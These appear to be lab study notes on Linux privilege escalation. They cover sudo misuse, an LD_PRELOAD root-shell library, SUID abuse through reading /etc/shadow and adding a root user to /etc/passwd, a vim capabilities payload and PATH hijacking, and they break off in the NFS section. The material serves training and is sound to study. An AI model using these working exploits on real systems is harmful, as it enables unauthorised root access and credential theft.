
### sudo

The `sudo` command, by default, allows us to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the `sudo -l `command.

> [!tip]
> [GTFO bins](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which we may have sudo rights, can be used.

#### Application functions

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "*hack*" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).

```bash
$ apache2 -h
Usage: apache2 [-D name] [-d directory] [-f file]
               [-C "directive"] [-c "directive"]
               [-k start|restart|graceful|graceful-stop|stop]
               [-v] [-V] [-h] [-l] [-L] [-t] [-T] [-S] [-X]
Options:
  -D name            : define a name for use in <IfDefine name> directives
  -d directory       : specify an alternate initial ServerRoot
  -f file            : specify an alternate ServerConfigFile
  -C "directive"     : process directive before reading config files
  -c "directive"     : process directive after reading config files
  -e level           : show startup errors of level (see LogLevel)
  -E file            : log startup errors to file
  -v                 : show version number
  -V                 : show compile settings
  -h                 : list available command line options (this page)
  -l                 : list compiled in modules
```

#### LD_PRELOAD

On some systems, you may see the LD_PRELOAD environment option. ^f03211

```bash
useradebian:/home$ sudo -l
Matching Default entries for user on this host:
	env_reset, env_keep+=LD_PRELOAD
```

LD_PRELOAD is a function that allows any program to *use shared libraries*. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarised as follows;

 1. Check for LD_PRELOAD (with the env_keep option)
 2. Write a simple C code compiled as a share object (.so extension) file
 3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

A C code will simply spawn a root shell and can be written as follows;

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

```bash
user@debian:~/ldpreload$ cat shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init () {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
user@debian: ~/dpreload$ ls
shell.c
user@debian:~/dpreload$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
user@debian: ~/dpreload$ ls
shell. shell.so
user@debian:~/ldpreload$
```

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

This will result in a shell spawn with root privileges.

```bash
user@debian:~/ldpreload$ id
uid=1000(user) gid=1000(user) groups=1000(user), 24(cdrom), 25(floppy), 29(audio), 30(dip), 44(video), 46(plugdev)
user@debian: ~/ldpreload$ whoami
user
user@debian:~/ldpreload$ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find root@debian:/home/user/ldpreload# id
uid-0(root) gid-0(root) groups=0(root)
root@debian:/home/user/ldpreload# whoami
root
root@debian:/home/user/ldpreload#
```

### SUID

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, we know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with **SUID** (Set-user Identification) and **SGID** (Set-group Identification). These *allow files to be executed with the permission level of the file owner or the group owner*, respectively. ^257fb3

You will notice these files have an “**s**” bit set showing their special permission level.

`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.

```bash
$ find / -type f -perm -04000 -ls 2>/dev/null
       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/10185/bin/mount
       80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/10185/bin/ping
       81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/10185/bin/ping6
       98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/10185/bin/su
      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/10185/bin/umount
     2610     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/10185/usr/bin/chfn
     2612     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/10185/usr/bin/chsh
     2689     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/10185/usr/bin/gpasswd
     2781     39 -rwsr-xr-x   1 root     root        39904 Mar 25  2019 /snap/core/10185/usr/bin/newgrp
     2794     53 -rwsr-xr-x   1 root     root        54256 Mar 25  2019 /snap/core/10185/usr/bin/passwd
     2904    134 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /snap/core/10185/usr/bin/sudo
```

Example:

The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.

Below are simple steps using both vectors.

*reading the /etc/shadow file*

`nano /etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the `unshadow` tool to **create a file crackable by John the Ripper**. To achieve this, `unshadow` needs both the `/etc/shadow` and `/etc/passwd` files.

```bash
unshadow /etc/passwd /etc/shadow > password.txt
```

*adding a user*

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

```bash
$ openssl passwd -1 -salt THM password1
$1$THM$WnbwlliCqxFRQepUTCkUT1
```

We will then add this password with a username to the `/etc/passwd` file by including this line at the end of the file.

```
hacker: $1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
```

Once our user is added we will need to switch to this user and hopefully should have root privileges.

```bash
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user), 24(cdrom), 25(floppy), 29(audio),30 (dip), 44(video), 46 (plugdev) 
user@debian:~$ whoami
user
user@debian:~$ su hacker
Password: 
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user# whoami
root
root@debian:/home/user#
```

### Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “**Capabilities**”. 

Capabilities help manage *privileges at a more granular level*. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.


The capabilities man page provides detailed information on its usage and options. We can use the `getcap` tool to list enabled capabilities.

```bash
$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

[GTFObins](https://gtfobins.github.io/#+capabilities) has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

We notice that vim under `/home/karen/vim` can be used with the following command and payload:
```bash
$ /home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

### Cron Jobs

Cron jobs are used to run scripts or binaries at specific times. By default, *they run with the privilege of their owners* and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.

The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Cron job configurations are stored as `crontabs` (cron tables) to see the next time and date the task will run. Any user can read the file keeping system-wide cron jobs under `/etc/crontab`

In the odd event we find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be *exploited* using their *wildcard* feature.

### PATH

If a *folder* for which your user has *write permission* is located in the path, you could potentially hijack an application to run a script. **PATH** in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. 

If we type “`thm`” to the command line, these are the locations Linux will look in for an executable called `thm`. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the *existing configuration* of the target system, so be sure you can answer the questions below before trying this.

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

For demo purposes, consider the script below:

```C
#include<unistd.h>
void main()
{setuid(0);
 setgid(0);
 system("thm");
}
```

This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.

We compile this into an executable and set the SUID bit.

```bash
root@targetsystem:/home/alper/Desktop# gcc path_exp.c -o path -w
root@targetsystem:/home/alper/Desktop# chmod u+s path
root@targetsystem:/home/alper/Desktop# ls -l
total 24
-rwsr-xr-x 1 root root 16792 Jun 17 07:02 path
-rw-rw-r-- 1 alper alper 76 Jun 17 06:53 path_exp.c
root@targetsystem:/home/alper/Desktop#
```

Our user now has access to the “path” script with SUID bit set.

```bash
alper@targetsystem:~/Desktop$ 1s -1
total 24
-rwsr-xr-x 1 root root 16792 Jun 17 07:02 path
-rw-rw-r-- 1 alper alper 76 Jun 17 06:53 path_exp.c
```

Once executed “path” will look for an executable named “thm” inside folders listed under PATH.

If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege

A simple search for writable folders can done using the `find / -writable 2>/dev/null` command. The output of this command can be cleaned using a simple cut and sort sequence.

```bash
alperatargetsystem:~/Desktop$ find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u 
dev 
home 
proc 
run 
snap 
sys
tmp
usr 
var
alperatargetsystem:~/Desktop$ |
```

An alternative could be the command below.

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

The “grep -v proc” is to get rid of the many results related to running processes. Unfortunately, subfolders under */usr are not writable*

The folder that will be easier to write to is probably `/tmp`. At this point because `/tmp `is not present in PATH so *we will need to add it*. As we can see below, the “`export PATH=/tmp:$PATH`” command accomplishes this.

At this point the path script will also look under the /tmp folder for an executable named “thm”.

Creating this command is fairly easy by copying `/bin/bash` as “thm” under the /tmp folder.

```bash
alperatargetsystem:/$ cd /tmp 
alperatargetsystem:/tmp$ echo "/bin/bash" > thm 
alperatargetsystem:/tmp$ chmod 777 thm
alperatargetsystem:/tmp$ ls -1 
thm -rwxrwxrwx 1 alper alper 10 Jun 17 14:36 thm
```

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.

```bash
alperatargetsystem:~/Desktop$ whoami
alper
alperatargetsystem:~/Desktop$ id
uid=1000(alper) gid=1000(alper) groups=1000(alper), 4(adm),24(cdrom),27 (sudo),30(dip),46(plugdev),120(padmin), 131(1xd), 132(sambashare) alperatargetsystem:~/Desktop$ ./path
rootatargetsystem:~/Desktop# whoami
root
rootatargetsystem:~/Desktop# id
uid=0(root) gid=0(root) groups=0(root), 4(adm),24(cdrom),27 (sudo),30(dip),46(plugdev),120(padmin), 131(1xd), 132(sambashare), 1000(alper)
root@targetsystem: ~/Desktop#
```

### NFS

NFS (Network File Sharing) configuration is kept in the `/etc/exports` file. This file is created during the NFS server installation and can usually be read by users.

```bash
$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

The critical element for this privilege escalation vector is the “**no_root_squash**” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. 

If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.

```bash
$ showmount -e 10.10.115.52
Export list for 10.10.115.52:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.

